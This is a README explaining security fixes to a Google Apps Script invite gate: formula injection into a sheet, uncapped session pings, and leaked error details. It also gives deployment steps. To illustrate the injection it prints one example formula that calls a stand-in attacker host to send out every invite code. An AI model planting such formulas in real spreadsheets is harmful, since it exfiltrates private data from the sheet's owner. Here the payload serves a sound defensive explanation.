# The invite gate's script, patched — belongs in `mando`, parked here

**This file does not belong to this repository.** It is `hoai2k/mando`'s
`tools/gate/Code.gs` with three security fixes applied, sitting here only because the session
that wrote it could not push to `mando`. Copy `Code.gs` into
`mando/tools/gate/Code.gs`, commit it there, **and delete this directory.** Nothing in Cambrian
Conquest or Devonian Domination reads it, and a second copy of the door that can drift from the
real one is exactly the failure `tools/gate/gate.js` warns about in its own header.

Cambrian is not behind the gate. This is here as a delivery van, not as a home.

## What changed, and why

### 1. Formula injection — anonymous, and it reached the `Codes` tab

`appendRow` and `setValues` write a string as if it had been typed, so a value beginning `=`, `+`,
`-` or `@` was stored as a **live formula** and evaluated in the owner's browser, with the owner's
authority, the moment the sheet was opened. Three paths wrote caller-controlled strings raw:

- `refuse_()` — `c.tz`, `c.lang`, `c.screen`, `c.ua`, `c.ref`, and `game` in the FLOOD row.
- `handleSession_()` — `game`, `name` and `id`, not even coerced to strings. **A session ping needs
  no invite**, so this was open to anyone who read the endpoint URL out of a published bundle.
- `refreshSummary()` copied planted names into the `Who` tab with `setValues`, so a payload
  survived a rebuild and landed somewhere the owner is even more likely to be looking.

The sheet holds the guest list, which is what makes it worth attacking:

```
=IMPORTXML("https://evil.example/?x="&TEXTJOIN(",",1,Codes!A:A),"//a")
```

fetches an attacker's URL with **every invite code appended to it**, taken by somebody who never
had one. `safe_()` now stands in front of every value that reaches a cell: a leading apostrophe on
anything formula-shaped (not shown in the cell, so a referrer starting with a minus still reads
correctly), control characters stripped, length capped server-side.

### 2. Session pings had no cap

`refuse_()` was capped at 100 rows an hour; `handleSession_()` at nothing. A spreadsheet holds ten
million cells; fill it and `appendRow` throws — including the one inside `handleInvite_()`, which
runs *before* the door answers. The catch turns that into `{ok:false}` and **the door then stays
shut for every new friend**, permanently, until somebody deletes tabs by hand. `AUTH.md` documents
"the endpoint cannot be reached → the door stays shut" as an outage; it was also something a
stranger could arrange. Now capped at `SESSION_CAP_PER_HOUR` (500) with the same one-line FLOOD
marker the refusals use, both counting through a shared `bump_()`.

### 3. `doPost` handed internal errors to the caller

`detail: String(err)` went back to an anonymous caller. Exception strings name tabs, ranges and
quota states. It goes to the execution log now; the reply says only that something failed.

## What this does *not* fix

**Denial of service, which Apps Script cannot defend against here.** `doPost` is given no client
IP, so per-visitor rate limiting does not exist as an option — the caps protect the *spreadsheet*,
not the daily execution quota. Anyone who knows the URL can spend a consumer account's runtime
allowance and take the endpoint down until midnight, which means no new friends are admitted that
day. Existing pass-holders are unaffected; they never touch this path to play.

## Applying it

1. Copy this `Code.gs` over `mando/tools/gate/Code.gs` and commit it there.
2. Open the bound Sheet ▸ **Extensions ▸ Apps Script**, select all, paste this file over it.
3. **Deploy ▸ Manage deployments ▸** pencil ▸ Deploy. This keeps the same `/exec` URL, so no game
   needs rebuilding.
4. Check it still answers: open the `/exec` URL in a private window, expect
   `{"ok":true,"service":"invite-gate"}`.
5. Redeem a test invite (`?gatereset=1&invite=YOUR-CODE`) and confirm a row lands in `Signins`.
6. Delete this directory.

`AUTH.md` in `mando` should gain a note about the sanitiser when this lands, next to the passage
about what the `Refused` tab can and cannot record.
